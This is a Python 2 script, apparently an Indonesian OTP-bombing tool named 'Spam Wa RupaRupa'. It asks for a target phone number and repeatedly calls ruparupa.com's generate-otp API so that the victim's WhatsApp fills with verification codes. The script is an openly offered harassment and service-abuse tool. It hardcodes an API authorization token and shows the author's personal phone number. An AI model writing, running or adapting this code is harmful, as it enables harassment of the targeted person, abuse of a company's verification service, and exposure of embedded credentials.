# -*- coding: utf-8 -*-
import json, requests, os, sys,time
from time import sleep

def load():
    kon = [
     '121','120','119','118','117','116','115','114','113','112','111','110','109','108','107','106','105','104','103','102','101','100','99','98','97','96','95','94','93','92','91','90','89','88','87','86','85','84','83','82','81','80','79','78','77','76','75','74','73','72','71','70','69','68','67','66','65','64','63','62','61','60', '59', '58', '57', '56', '55', '54', '53', '52', '51', '50', '49', '48', '47', '46', '45', '44', '43', '42', '41', '40', '39', '38', '37', '36', '35', '34', '33', '32', '31', '30', '29', '28', '27', '26', '25', '24', '23', '22', '21', '20', '19', '18', '17', '16', '15', '14', '13', '12', '11', '10', '9', '8', '7', '6', '5', '4', '3', '2', '1', '0']
    for mem in kon:
        print bi + '\r\t>> ' + pu + 'Tunggu ' + bi + mem + pu + ' s',
        sys.stdout.flush()
        time.sleep(1)
 
banner = """\n\x1b[1;91m
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░▐░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▐░▌ ▐░▌▐░▌   ▄   ▐░▌▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▀   ▐░▌▐░▌ ▐░▌░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌
          ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌
 ▄▄▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌░▌   ▐░▐░▌▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░░▌     ▐░░▌▐░▌       ▐░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀            ▀         ▀  ▀         ▀  ▀▀       ▀▀  ▀         ▀ 
                                       
                                                              \n"""

def menu():
	os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
	os.system("echo Nama Tool: Spam Wa RupaRupa | lolcat -a")
	os.system("echo Author: N4B1Lx75 | lolcat -a")
	os.system("echo Whatsapp: +628811883541 | lolcat -a")
	os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
	os.system("echo Youtube: Nothing | lolcat -a")
	os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")

def spam(nomor, jml):
		try:
			for spm in range(jml):
				b = r.post(url2,headers=hdurl2,data=dataurl2json).text
				if "Permintaan kode OTP sudah mencapai batas, silakan tunggu 1x24 jam" in b:
					print pu+"\nPermintaan kode OTP sudah mencapai batas, silakan tunggu 1x24 jam"
					sleep(2)
					exit("")
				else:
					print pu+"\n\t[SUCCES]=> ",nomor
					sleep(1)
					load()
		except requests.exceptions.ConnectionError:
				exit('\n!Tidak Ada Koneksi')


#os.system("clear")
bi = '\x1b[1;96m'
pu = '\x1b[1;97m'
print banner
menu()
nomor = raw_input("\n[~] Contoh: 08xxx\n[~] Masukkan nomor target: ")
jml = int(raw_input("[•] Jumlah spam: "))
url2 = 'https://wapi.ruparupa.com/auth/generate-otp'
hdurl2 = {
		'accept': 'application/json',
		'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
		'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
		'content-length': '103',
		'content-type': 'application/json',
		'origin': 'https://ruparupa.com',
		'referer': 'https://ruparupa.com/verification?page=otp-choices',
		'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
		}
dataurl2 = {"phone":nomor,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0}
dataurl2json = json.dumps(dataurl2)
r = requests.Session()
spam(nomor, jml)
